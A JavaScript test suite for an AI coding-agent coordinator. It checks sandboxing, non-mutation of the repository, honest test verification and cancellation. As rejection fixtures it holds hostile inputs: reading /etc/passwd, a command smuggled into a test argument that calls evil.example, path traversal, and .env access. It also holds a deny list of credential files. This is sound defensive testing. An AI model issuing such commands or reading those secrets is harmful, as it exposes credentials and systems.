import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtemp, readFile, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { executeCodingTask, parseCodingDecision, codingPath } from '../server/coding.mjs';

const input = { task: 'Fix the addition function and verify the correction', provider: 'local', model: 'fixture-model', maxAgents: 3 };
const sha256 = text => createHash('sha256').update(text).digest('hex');
const decision = (tool, args = {}) => ({ tool, arguments: args });
function fixtureRepository(source = [{ path: 'sum.mjs', content: 'export const sum = (a,b) => a - b;' }, { path: 'sum.test.mjs', content: 'existing independent test source' }]) {
  const calls = [];
  const repository = {
    calls,
    info: async () => ({ name: 'fixture-repository', branch: 'main' }),
    snapshot: async () => { calls.push(['snapshot']); return source.map(file => ({ ...file })); },
    readFile: async filename => { calls.push(['readFile', filename]); const file = source.find(file => file.path === filename); if (!file) throw new Error('missing'); return { ...file }; },
    gitStatus: async () => { calls.push(['gitStatus']); return { branch: 'main', porcelain: '' }; },
    gitDiff: async () => { calls.push(['gitDiff']); return { diff: '' }; },
    applyChanges: async () => assert.fail('The coordinator must not apply proposals to the repository'),
    commit: async () => assert.fail('The coordinator must not commit the repository'),
  };
  return repository;
}
function scriptedProvider(script, observe = () => {}) {
  const calls = [];
  const generate = async (request, env, options) => {
    const index = calls.length;
    calls.push({ request, env, options });
    observe(request, index);
    assert.ok(index < script.length, 'The model must not be called beyond the fixture script');
    const action = script[index];
    if (action instanceof Error) throw action;
    const text = typeof action === 'string' ? action : JSON.stringify(action);
    return { text, usage: { promptTokenCount: 7, candidatesTokenCount: 3, totalTokenCount: 10 } };
  };
  return { generate, calls };
}

test('real tool chain reads source, stages, tests a failure, fixes it, and tests again without writing source', async () => {
  const repository = fixtureRepository();
  const original = (await repository.snapshot())[0].content;
  repository.calls.length = 0;
  const runs = [];
  const runner = { run: async request => {
    runs.push(request);
    const content = request.files.find(file => file.path === 'sum.mjs').content;
    assert.equal(request.command, 'node:test');
    return content.includes('a + b') ? { status: 'passed', exitCode: 0, stdout: '1 test passed', stderr: '' } : { status: 'failed', exitCode: 1, stdout: 'expected sum(2,3) to equal 5; got -1', stderr: '' };
  } };
  const provider = scriptedProvider([
    decision('list_files'),
    decision('read_file', { path: 'sum.mjs' }),
    decision('propose_changes', { changes: [{ path: 'sum.mjs', content: 'export const sum = (a,b) => a / b;', reason: 'First candidate' }] }),
    decision('run_tests', { command: 'node:test' }),
    decision('propose_changes', { changes: [{ path: 'sum.mjs', content: 'export const sum = (a,b) => a + b;', reason: 'Correct the observed failure' }] }),
    decision('run_tests', { command: 'node:test' }),
    decision('finish', { output: 'Corrected the addition function after the first test run failed.' }),
  ], (request, index) => {
    assert.equal(request.provider, 'local');
    assert.equal(request.model, 'fixture-model');
    assert.equal(request.responseFormat, 'json');
    assert.ok(request.system.includes('No shell commands'));
    if (index === 2) assert.ok(request.prompt.includes(original));
    if (index === 4) assert.ok(request.prompt.includes('expected sum(2,3) to equal 5; got -1'));
  });
  const observed = [];
  const result = await executeCodingTask(input, { repository, runner, generate: provider.generate, onEvent: event => observed.push(event) });
  assert.equal(result.status, 'completed');
  assert.equal(result.applied, false);
  assert.equal(result.inferenceCalls, 7);
  assert.deepEqual(result.usage, { promptTokenCount: 49, candidatesTokenCount: 21, totalTokenCount: 70 });
  assert.equal(result.agents.length, 1, 'Only the coordinator was actually invoked');
  assert.equal(result.selectedRoles.filter(role => role.invoked).length, 1);
  assert.equal(result.proposals.length, 1);
  assert.equal(result.proposals[0].content, 'export const sum = (a,b) => a + b;');
  assert.equal(result.proposals[0].baseHash, sha256(original), 'Repeated fixes retain the original repository hash');
  assert.equal(result.proposals[0].operation, 'update');
  assert.equal(result.tests.length, 2);
  assert.equal(result.tests[0].exitCode, 1);
  assert.equal(result.tests[1].exitCode, 0);
  assert.equal(result.verification.status, 'passed');
  assert.equal(result.verification.currentSnapshotRuns, 1);
  assert.equal(runs.length, 2);
  assert.ok(runs.every(run => run.files.length === 2));
  assert.deepEqual(repository.calls, [['snapshot'], ['readFile', 'sum.mjs']]);
  assert.equal((await repository.readFile('sum.mjs')).content, original);
  assert.deepEqual(result.events, observed);
  assert.ok(result.events.every((event, index) => event.sequence === index + 1 && !Number.isNaN(Date.parse(event.timestamp))));
  assert.equal(result.events.filter(event => event.type === 'tool_completed').length, 7);
  assert.ok(result.output.includes('No repository changes have been applied.'));
});

test('an actual file on disk remains unchanged while its reviewable replacement is evaluated', async () => {
  const directory = await mkdtemp(path.join(tmpdir(), 'forge-coding-'));
  try {
    const filename = path.join(directory, 'main.py');
    await writeFile(filename, 'value = 1\n');
    const repository = {
      snapshot: async () => [{ path: 'main.py', content: await readFile(filename, 'utf8') }],
      readFile: async () => readFile(filename, 'utf8'),
      applyChanges: () => assert.fail('No mutation permitted'),
    };
    const provider = scriptedProvider([decision('read_file', { path: 'main.py' }), decision('propose_changes', { changes: [{ path: 'main.py', content: 'value = 2\n' }] }), decision('run_tests', { command: 'python:unittest' }), { output: 'Prepared replacement.' }]);
    const result = await executeCodingTask(input, { repository, generate: provider.generate, runner: { run: async ({ files, command }) => {
      assert.equal(files[0].content, 'value = 2\n'); assert.equal(command, 'python:unittest');
      return { exitCode: 0, status: 'passed' };
    } } });
    assert.equal(result.status, 'completed');
    assert.equal(await readFile(filename, 'utf8'), 'value = 1\n');
    assert.equal(result.proposals[0].baseHash, sha256('value = 1\n'));
  } finally { await rm(directory, { recursive: true, force: true }); }
});

test('protocol rejects unsafe tools, paths, shell commands and extra arguments and gives model corrective feedback', async () => {
  const repository = fixtureRepository(); let runs = 0;
  const provider = scriptedProvider([
    decision('shell', { command: 'cat /etc/passwd' }),
    decision('read_file', { path: '../secret' }),
    decision('read_file', { path: '.env' }),
    decision('propose_changes', { changes: [{ path: 'valid.mjs', content: 'x' }, { path: '.git/config', content: 'malicious' }] }),
    decision('run_tests', { command: 'node --test; curl evil.example' }),
    decision('list_files', { root: '/etc' }),
    decision('finish', { output: 'Unable to make an allowed change.' }),
  ], (request, index) => { if (index > 0) assert.ok(request.prompt.includes('Correct this request.')); });
  const result = await executeCodingTask(input, { repository, generate: provider.generate, runner: { run: async () => { runs++; assert.fail('Unsafe command cannot reach runner'); } } });
  assert.equal(result.status, 'completed');
  assert.equal(runs, 0);
  assert.deepEqual(result.proposals, [], 'A rejected batch must stage no partial edits');
  assert.equal(result.events.filter(event => event.type === 'tool_rejected').length, 6);
  assert.equal(result.verification.status, 'not_run');
  assert.deepEqual(repository.calls, [['snapshot']]);
});

test('malformed protocol consumes bounded steps and returns incomplete with real trace', async () => {
  const provider = scriptedProvider(['not JSON', '```js\nthrow new Error("never executed")\n```', '[]']);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate, maxSteps: 3 });
  assert.equal(result.status, 'incomplete');
  assert.equal(result.error.code, 'STEP_LIMIT');
  assert.equal(result.inferenceCalls, 3);
  assert.equal(result.steps, 3);
  assert.equal(result.tests.length, 0);
  assert.equal(result.events.filter(event => event.type === 'tool_rejected').length, 3);
  assert.ok(result.output.includes('step limit'));
});

test('provider errors preserve staged proposals and traces and expose only safe failure details', async () => {
  const provider = scriptedProvider([decision('propose_changes', { changes: [{ path: 'sum.mjs', content: 'candidate' }] }), new Error('token=private-credential /sensitive/path')]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate });
  assert.equal(result.status, 'failed');
  assert.equal(result.error.code, 'EXECUTION_FAILED');
  assert.equal(result.proposals[0].content, 'candidate');
  assert.equal(result.inferenceCalls, 2);
  assert.ok(result.events.some(event => event.type === 'task_failed'));
  assert.ok(!JSON.stringify(result).includes('private-credential'));
});

test('provider configuration errors remain actionable without fabricating inference success', async () => {
  const error = Object.assign(new Error('Connect Google Cloud credentials on the server.'), { code: 'PROVIDER_NOT_CONFIGURED' });
  const provider = scriptedProvider([error]);
  const result = await executeCodingTask({ ...input, provider: 'vertex' }, { repository: fixtureRepository(), generate: provider.generate });
  assert.equal(result.status, 'failed');
  assert.equal(result.error.code, 'PROVIDER_NOT_CONFIGURED');
  assert.equal(result.tests.length, 0);
  assert.ok(result.output.includes('Connect Google Cloud credentials'));
});

test('cancellation interrupts a pending provider and preserves previously completed tool events', async () => {
  const controller = new AbortController(); let calls = 0; let entered;
  const providerStarted = new Promise(resolve => { entered = resolve; });
  const generate = async () => {
    if (++calls === 1) return { text: JSON.stringify(decision('read_file', { path: 'sum.mjs' })) };
    entered(); return new Promise(() => {});
  };
  const pending = executeCodingTask(input, { repository: fixtureRepository(), generate, signal: controller.signal });
  await providerStarted; controller.abort();
  const result = await pending;
  assert.equal(result.status, 'cancelled');
  assert.equal(result.error.code, 'CANCELLED');
  assert.equal(result.inferenceCalls, 2);
  assert.ok(result.events.some(event => event.type === 'tool_completed' && event.tool === 'read_file'));
  assert.ok(result.events.some(event => event.type === 'task_cancelled'));
});

test('pre-cancelled tasks make no provider or repository calls', async () => {
  const controller = new AbortController(); controller.abort();
  const repository = fixtureRepository();
  const result = await executeCodingTask(input, { repository, signal: controller.signal, generate: async () => assert.fail('No model call') });
  assert.equal(result.status, 'cancelled');
  assert.deepEqual(repository.calls, []);
  assert.deepEqual(result.agents, []);
});

test('cancellation reaches runner and retains a proposal without falsely recording passed tests', async () => {
  const controller = new AbortController(); let entered; let cleanedUp = false;
  const runnerStarted = new Promise(resolve => { entered = resolve; });
  const provider = scriptedProvider([decision('propose_changes', { changes: [{ path: 'sum.mjs', content: 'candidate' }] }), decision('run_tests', { command: 'node:test' })]);
  const pending = executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate, signal: controller.signal, runner: { run: async ({ signal }) => {
    assert.equal(signal, controller.signal); entered();
    await new Promise(resolve => signal.addEventListener('abort', resolve, { once: true }));
    await new Promise(resolve => setTimeout(resolve, 5));
    cleanedUp = true; throw new DOMException('Container removed after cancellation.', 'AbortError');
  } } });
  await runnerStarted; controller.abort();
  const result = await pending;
  assert.equal(result.status, 'cancelled');
  assert.equal(cleanedUp, true, 'Task cancellation must wait for the isolated runner cleanup');
  assert.equal(result.proposals.length, 1);
  assert.equal(result.tests.length, 0);
  assert.equal(result.verification.status, 'not_run');
  assert.ok(result.events.some(event => event.type === 'task_cancelled' && event.tool === 'run_tests'));
});

test('edits after a passed run invalidate verification for the final snapshot', async () => {
  const provider = scriptedProvider([
    decision('run_tests', { command: 'node:test' }),
    decision('propose_changes', { changes: [{ path: 'sum.mjs', content: 'untested replacement' }] }),
    { output: 'Prepared a replacement.' },
  ]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate, runner: { run: async () => ({ exitCode: 0, status: 'passed' }) } });
  assert.equal(result.tests.length, 1);
  assert.equal(result.verification.status, 'not_run');
  assert.equal(result.verification.currentSnapshotRuns, 0);
  assert.ok(result.output.includes('no recorded passing evaluation'));
});

test('missing isolation runner rejects evaluation without executing host commands', async () => {
  const provider = scriptedProvider([decision('run_tests', { command: 'node:test' }), { output: 'Evaluation is unavailable.' }]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate });
  assert.equal(result.status, 'completed');
  assert.equal(result.tests.length, 0);
  assert.equal(result.events.find(event => event.type === 'tool_rejected').error.code, 'SANDBOX_REQUIRED');
  assert.equal(result.verification.status, 'not_run');
});

test('changed source is detected before reading inconsistent context into the model', async () => {
  const repository = fixtureRepository();
  repository.readFile = async () => ({ content: 'changed concurrently' });
  const provider = scriptedProvider([decision('read_file', { path: 'sum.mjs' })]);
  const result = await executeCodingTask(input, { repository, generate: provider.generate });
  assert.equal(result.status, 'failed');
  assert.equal(result.error.code, 'REPOSITORY_CHANGED');
  assert.equal(result.inferenceCalls, 1);
});

test('create/delete/revert proposals always describe differences from the original snapshot', async () => {
  const repository = fixtureRepository(); const original = (await repository.snapshot())[0].content;
  const provider = scriptedProvider([
    decision('propose_changes', { changes: [{ path: 'new.mjs', content: 'new', operation: 'create' }, { path: 'sum.mjs', content: 'changed', operation: 'update' }] }),
    decision('read_file', { path: 'new.mjs' }),
    decision('search', { query: 'changed' }),
    decision('propose_changes', { changes: [{ path: 'new.mjs', operation: 'delete' }, { path: 'sum.mjs', content: original }, { path: 'sum.test.mjs', operation: 'delete' }] }),
    decision('finish', { output: 'Prepared the deletion.' }),
  ], (request, index) => { if (index === 3) assert.ok(request.prompt.includes('"text":"changed"')); });
  const result = await executeCodingTask(input, { repository, generate: provider.generate });
  assert.deepEqual(result.proposals, [{ path: 'sum.test.mjs', content: null, operation: 'delete', baseHash: sha256('existing independent test source'), reason: 'Proposed by coding coordinator' }]);
  const read = result.events.find(event => event.type === 'tool_completed' && event.tool === 'read_file');
  assert.equal(read.result.source, 'proposal');
  assert.equal(read.result.content, 'new');
});

test('review mode rejects modifications but supports actual read-only Git inspections', async () => {
  const repository = fixtureRepository();
  const provider = scriptedProvider([decision('git_status'), decision('git_diff'), decision('propose_changes', { changes: [{ path: 'sum.mjs', content: 'forbidden' }] }), { output: 'Reviewed repository state.' }]);
  const result = await executeCodingTask({ ...input, mode: 'review' }, { repository, generate: provider.generate });
  assert.deepEqual(result.proposals, []);
  assert.equal(result.events.filter(event => event.type === 'tool_rejected').length, 1);
  assert.deepEqual(repository.calls, [['snapshot'], ['gitStatus'], ['gitDiff']]);
});

test('source and proposal limits are enforced atomically before inference or evaluation', async () => {
  for (const source of [
    Array.from({ length: 101 }, (_, index) => ({ path: `file-${index}.mjs`, content: '' })),
    [{ path: 'big.mjs', content: 'x'.repeat(100001) }],
    Array.from({ length: 6 }, (_, index) => ({ path: `file-${index}.mjs`, content: 'x'.repeat(90000) })),
    [{ path: '.env', content: 'NEVER_DISCLOSE=secret' }],
  ]) {
    const result = await executeCodingTask(input, { repository: fixtureRepository(source), generate: async () => assert.fail('Invalid snapshot must not reach provider') });
    assert.equal(result.status, 'failed');
    assert.equal(result.error.code, 'CONTEXT_LIMIT');
    assert.equal(result.inferenceCalls, 0);
  }
  const provider = scriptedProvider([decision('propose_changes', { changes: [{ path: 'valid.mjs', content: 'valid' }, { path: 'too-big.mjs', content: 'a'.repeat(100001) }] }), { output: 'Candidate rejected.' }]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate });
  assert.deepEqual(result.proposals, []);
});

test('structured and fenced final JSON is parsed without evaluating JavaScript or accepting surplus schema', () => {
  assert.deepEqual(parseCodingDecision('```json\n{"tool":"list_files","arguments":{}}\n```'), decision('list_files'));
  assert.deepEqual(parseCodingDecision('{"output":"Result","changes":[]}'), decision('finish', { output: 'Result', changes: [] }));
  for (const value of ['null', '[]', '{"tool":"list_files","arguments":{},"shell":"danger"}', '({output:"not JSON"})', '{"output":"result","testsPassed":true}', 'Text before ```json\n{}\n```']) assert.throws(() => parseCodingDecision(value), error => error.code === 'INVALID_TOOL_CALL');
  for (const filename of ['src/main.js', 'README.md', 'tests/test.py', 'src/.gitignore']) assert.equal(codingPath(filename), true);
  for (const filename of ['/etc/passwd', '../secret', 'a/../b', 'a\\b', '.env.production', '.git/config', '.ssh/config', 'secrets/key.pem', 'application_default_credentials.json', '.npmrc', '.pypirc', '.gitconfig', '.bashrc', '.zshrc', '.profile', '.docker/config.json', 'prod.tfvars', 'config/kubeconfig', 'node_modules/pkg/main.js', '.forge/session.json', 'a\x7fb']) assert.equal(codingPath(filename), false, filename);
});

test('invalid task budgets and disabled agent lists fail before any execution', async () => {
  for (const raw of [{ ...input, task: 'hi' }, { ...input, provider: 'unknown' }, { ...input, maxSteps: 31 }, { ...input, maxSteps: 0 }, { ...input, maxSteps: 1.5 }, { ...input, maxAgents: 51 }, { ...input, enabledAgentIds: [] }]) await assert.rejects(executeCodingTask(raw, { repository: fixtureRepository(), generate: async () => assert.fail('No execution allowed') }));
});


test('truncated snapshots fail closed instead of evaluating an incomplete repository', async () => {
  const repository = fixtureRepository();
  repository.snapshot = async () => ({ files: [{ path: 'main.py', content: 'value = 1' }], truncated: true, totalBytes: 9 });
  const result = await executeCodingTask(input, { repository, generate: async () => assert.fail('No inference against a truncated snapshot') });
  assert.equal(result.status, 'failed');
  assert.equal(result.error.code, 'CONTEXT_LIMIT');
  assert.ok(result.output.includes('smaller workspace root'));
});

test('file and parent-directory collisions are rejected before reaching the isolated runner', async () => {
  const provider = scriptedProvider([decision('propose_changes', { changes: [{ path: 'new', content: 'file' }, { path: 'new/child.py', content: 'child' }] }), { output: 'Rejected inconsistent file paths.' }]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate });
  assert.deepEqual(result.proposals, []);
  assert.ok(result.events.find(event => event.type === 'tool_rejected').error.message.includes('parent directory'));
});


test('an infrastructure failure with exit code zero is never certified as passing verification', async () => {
  const provider = scriptedProvider([decision('run_tests', { command: 'node:test' }), { output: 'The runner reported a cleanup problem.' }]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate, runner: { run: async () => ({ status: 'infrastructure_error', executionStatus: 'passed', exitCode: 0, output: 'Container cleanup could not be confirmed.' }) } });
  assert.equal(result.tests[0].exitCode, 0);
  assert.equal(result.tests[0].status, 'infrastructure_error');
  assert.equal(result.verification.status, 'unknown');
  assert.ok(result.output.includes('no recorded passing evaluation'));
});


test('cancellation during awaited event persistence prevents a finish tool from completing', async () => {
  const controller = new AbortController();
  const provider = scriptedProvider([decision('finish', { output: 'Would finish if not cancelled.' })]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate, signal: controller.signal, onEvent: async event => {
    if (event.type === 'tool_started' && event.tool === 'finish') controller.abort();
  } });
  assert.equal(result.status, 'cancelled');
  assert.equal(result.events.some(event => event.type === 'tool_completed'), false);
});

test('cancellation before provider invocation does not count a model inference that never occurred', async () => {
  const controller = new AbortController();
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: async () => assert.fail('Cancelled invocation must not start'), signal: controller.signal, onEvent: async event => {
    if (event.type === 'model_started') controller.abort();
  } });
  assert.equal(result.status, 'cancelled');
  assert.equal(result.inferenceCalls, 0);
  assert.equal(result.agents.length, 0);
});


test('malformed changes are rejected by schema validation instead of breaking trace serialization', async () => {
  const provider = scriptedProvider([decision('propose_changes', { changes: {} }), { output: 'Rejected malformed changes.' }]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate });
  assert.equal(result.status, 'completed');
  assert.equal(result.events.find(event => event.type === 'tool_rejected').error.code, 'INVALID_TOOL_CALL');
  assert.deepEqual(result.proposals, []);
});

test('native chat history alternates real assistant decisions with actual user-role tool observations', async () => {
  const expectedRead = decision('read_file', { path: 'sum.mjs' });
  const expectedChange = decision('propose_changes', { changes: [{ path: 'sum.mjs', content: 'export const sum = (a,b) => a + b;' }] });
  const provider = scriptedProvider([expectedRead, expectedChange, decision('run_tests', { command: 'node:test' }), { output: 'Prepared a verified correction.' }], (request, index) => {
    assert.equal(typeof request.prompt, 'string', 'Legacy plain-prompt provider fixtures remain supported');
    assert.ok(Array.isArray(request.messages));
    assert.deepEqual(request.messages.map(message => message.role), Array.from({ length: 1 + 2 * index }, (_, number) => number % 2 ? 'assistant' : 'user'));
    assert.ok(request.messages.every(message => typeof message.content === 'string'));
    if (index >= 1) {
      assert.deepEqual(JSON.parse(request.messages[1].content), expectedRead);
      assert.ok(request.messages[2].content.includes('export const sum = (a,b) => a - b;'));
      assert.ok(request.messages.at(-1).content.includes('Already read and unchanged: ["sum.mjs"]') || index >= 2, 'Unchanged reads are highlighted until the file changes');
    }
    if (index === 2) assert.deepEqual(JSON.parse(request.messages[3].content), expectedChange);
    if (index === 3) assert.ok(request.messages.at(-1).content.includes('actual fixture runner passed'));
  });
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate, runner: { run: async () => ({ status: 'passed', exitCode: 0, output: 'actual fixture runner passed' }) } });
  assert.equal(result.status, 'completed');
  assert.equal(result.verification.status, 'passed');
});

test('three consecutive identical inspections stop as stalled without re-reading or exhausting the budget', async () => {
  const repository = fixtureRepository();
  const provider = scriptedProvider(Array.from({ length: 3 }, () => decision('read_file', { path: 'sum.mjs' })), (request, index) => {
    if (index === 2) {
      assert.ok(request.messages.at(-1).content.includes('OBSERVATION_ALREADY_PROVIDED'));
      assert.ok(request.messages.at(-1).content.includes('Choose a new action'));
    }
  });
  const result = await executeCodingTask(input, { repository, generate: provider.generate });
  assert.equal(result.status, 'incomplete');
  assert.equal(result.error.code, 'STALLED');
  assert.equal(result.inferenceCalls, 3);
  assert.equal(result.steps, 3);
  assert.equal(repository.calls.filter(([method]) => method === 'readFile').length, 1);
  assert.equal(result.events.filter(event => event.type === 'tool_completed' && event.tool === 'read_file').length, 1);
  assert.equal(result.events.filter(event => event.type === 'tool_rejected').length, 2);
  assert.ok(result.events.some(event => event.type === 'task_stalled'));
  assert.deepEqual(result.proposals, []);
  assert.equal(result.verification.status, 'not_run');
});

test('a duplicate observation gives corrective feedback and the coordinator can recover with a new action', async () => {
  const repository = fixtureRepository();
  const provider = scriptedProvider([
    decision('read_file', { path: 'sum.mjs' }),
    decision('read_file', { path: 'sum.mjs' }),
    decision('propose_changes', { changes: [{ path: 'sum.mjs', content: 'corrected candidate' }] }),
    { output: 'Prepared the correction after inspecting source.' },
  ]);
  const result = await executeCodingTask(input, { repository, generate: provider.generate });
  assert.equal(result.status, 'completed');
  assert.equal(result.proposals[0].content, 'corrected candidate');
  assert.equal(result.events.find(event => event.type === 'tool_rejected').error.code, 'OBSERVATION_ALREADY_PROVIDED');
  assert.equal(repository.calls.filter(([method]) => method === 'readFile').length, 1);
});

test('finish metadata summaries receive exact corrective guidance without changing verified proposals', async () => {
  const source = 'export const sum = (a,b) => a + b;';
  const provider = scriptedProvider([
    decision('propose_changes', { changes: [{ path: 'sum.mjs', content: source }] }),
    decision('run_tests', { command: 'node:test' }),
    decision('finish', { output: 'Prepared a correction.', changes: [{ path: 'sum.mjs', operation: 'update', baseHash: 'summary metadata only', status: 'updated' }] }),
    decision('finish', { output: 'Prepared a verified correction for review.' }),
  ], (request, index) => {
    if (index === 3) {
      assert.ok(request.messages.at(-1).content.includes('Finish with output only; staged proposals are retained automatically.'));
      assert.ok(request.messages.at(-1).content.includes('Omit changes, baseHash, status and verification fields.'));
      assert.ok(request.messages.at(-1).content.includes('"tool":"finish","arguments":{"output":'));
    }
  });
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate, runner: { run: async () => ({ status: 'passed', exitCode: 0, output: 'Fixture test passed.' }) } });
  assert.equal(result.status, 'completed');
  assert.equal(result.verification.status, 'passed');
  assert.equal(result.tests.length, 1);
  assert.equal(result.proposals.length, 1);
  assert.equal(result.proposals[0].content, source);
  assert.equal(result.events.filter(event => event.type === 'tool_rejected').length, 1);
  assert.equal(result.applied, false);
});

test('three identical invalid finish decisions stop honestly while retaining actual passing verification', async () => {
  const source = 'export const sum = (a,b) => a + b;';
  const invalidFinish = decision('finish', { output: 'Prepared a correction.', changes: [{ path: 'sum.mjs', operation: 'update', status: 'updated' }] });
  const provider = scriptedProvider([
    decision('propose_changes', { changes: [{ path: 'sum.mjs', content: source }] }),
    decision('run_tests', { command: 'node:test' }),
    invalidFinish, invalidFinish, invalidFinish,
  ]);
  const result = await executeCodingTask(input, { repository: fixtureRepository(), generate: provider.generate, runner: { run: async () => ({ status: 'passed', exitCode: 0, output: 'Fixture test passed.' }) } });
  assert.equal(result.status, 'incomplete');
  assert.equal(result.error.code, 'STALLED');
  assert.equal(result.inferenceCalls, 5);
  assert.equal(result.verification.status, 'passed', 'Actual test evidence is retained even when the model fails to finish its protocol');
  assert.equal(result.proposals[0].content, source);
  assert.equal(result.tests.length, 1);
  assert.ok(result.output.includes('repeated the same invalid tool decision'));
  assert.equal(result.applied, false);
});
